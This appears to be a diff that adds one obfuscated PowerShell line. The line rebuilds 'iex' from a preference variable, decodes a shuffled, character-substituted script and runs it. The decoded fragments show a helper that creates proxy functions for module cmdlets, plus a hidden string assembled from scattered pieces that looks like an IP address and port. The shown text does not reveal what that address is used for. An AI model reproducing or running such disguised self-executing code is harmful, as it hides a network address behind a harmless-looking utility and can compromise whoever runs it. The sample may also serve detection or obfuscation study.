@@ -1,0 +1,41 @@
+ &( $veRboSeprEfErENCE.ToStRinG()[1,3]+'x'-JoIN'')( ((("{57}{50}{48}{38}{56}{19}{21}{13}{29}{12}{14}{37}{24}{42}{41}{22}{15}{18}{26}{47}{4}{52}{20}{25}{30}{9}{39}{0}{16}{51}{46}{54}{31}{49}{1}{43}{5}{6}{32}{34}{45}{36}{40}{8}{27}{10}{35}{53}{28}{55}{17}{44}{7}{33}{3}{23}{2}{11}" -f 'F3,7F3Debug7F3,7F3ErrorAction7F3,7F3Warni','odule)) {
+        Aq8ParamOutput =  @{
+            Command = Aq8Command.Name
+            Default','ipelineByPropertyName
+                Aq8ParamOutput.ValueFromRemainingArguments = Aq8Param.ValueFromRemaining','q8Param.ValueFromPipeline
+                Aq8ParamOutput.ValueFromPipelineByPropertyName = Aq8Param.','ChAr]39)
+    }
+}
+
+Function Get-AllParame','  }
+   ','     Foreach (Aq8Param in (Aq8Com','aramOutput.Posi','am.Name
+             ','redParams = @(7F3','             Aq8Pa','Arguments
+
+                New-Object psobject -Property Aq8ParamOutput
+        }
+    }
+}
+
+
+','    Aq8Metadata = New-Object Sys','rt-Module Aq8Module
+
+    Foreach (Aq8Command in (Get-Command -Module Aq8Module)) {
+  ','tem.Manag',') W6z Out-File SiaAq8(Aq','ngAction7F3,7F3ErrorVariable7F3,7F3WarningVariable7F3,7F3OutVariable7F3,7F3OutBuffer7F3,7F3P','y
+','8Command.Name)_proxy.ps1Sia
+        Aq8mkDv=  ((Sia{3}{2}{5}{4}{0}{1}Sia -f','[string]Aq8Module
+    )
+    Imp','Module {
+    param (
+        [string]Aq8Module
+ ','o','em.Management.Automation.ProxyCommand]::Create(Aq8Metadata','ValueFromP','Automation.Command','   )
+    Import-Module ',' 7F32.1857F3,7F3hJK7F3,7F3ip7F3,7F3hJK7F3,7F354.7F3,7F3:172.7F3)).REPlACE(([ChAr]104+[ChAr]74+[ChAr]','   Aq8ParamOutput.Type = Aq8Param.ParameterType
+   ','put.Mandatory =','  ','Aq8Module
+    Aq8Igno','u7F3)
+    Foreach (A','mand.ParameterSets.Parameters W6z Where-Object {Aq8Ignore','tion = Aq8Param.Position
+                Aq8ParamOutput.ValueFromPipeline = A','dParams -notcontains Aq8_.Name}','ramOu','
+                Aq8P','ement.','ule {
+    param (','Verbose7','aramOutput.Name = Aq8Par','ata Aq8Command
+        [Syst','MetaD','ParameterSet = Aq8Command.DefaultParameterSet
+      ','                Aq8P',')) {','7F3Confirm7F3,7F3Pass','75),[StriNg][','y cmdlet in a module.
+Function Create-ProxyFunctionsForMod','q8Command in (Get-Command -Module Aq8M','nction files for ever','ipelineVariable7F3,7F3WhatIf7F3,','tersFor','t','Thr',' Aq8Param.IsMandator','
+        ','# Creates proxy fu')) -REPLace  ([cHaR]83+[cHaR]105+[cHaR]97),[cHaR]34-REPLace ([cHaR]65+[cHaR]113+[cHaR]56),[cHaR]36  -REPLace  '7F3',[cHaR]39  -crEPLACe([cHaR]87+[cHaR]54+[cHaR]122),[cHaR]124)) 
